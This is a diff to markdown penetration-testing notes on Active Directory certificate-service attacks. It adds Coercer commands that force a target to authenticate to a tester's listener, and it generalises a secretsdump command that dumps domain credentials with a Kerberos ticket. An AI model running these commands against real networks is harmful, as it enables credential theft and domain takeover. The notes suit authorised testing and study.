@@ -185,6 +185,14 @@ esc4 => abuse of a generic write (ACL) based vulnerability
 esc8 => relayx ntlm (attack can be played both with and without account)
 ```
 
+**How to list all coerce of target**
+
+
+```
+git clone https://github.com/p0dalirius/Coercer.git
+cd Coercer && make
+./Coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <Pentester-IP> <target>
+```
 
 **esc8** 
 
@@ -217,7 +225,7 @@ but you'll not be local administrator, but you can be using these commands which
 
 ```
 export KRB5CCNAME=/workspace/administrator.ccache
-secretsdump -k -no-pass ESSOS.LOCAL/'administrator$'@administrator.essos.local
+secretsdump -k -no-pass <domain>/'administrator$'@administrator.<domain>
 ```
 
 In case of secretsdump isn't working, we recommend you to create silver ticket( which is available only on the pwned machine and the pwned service )
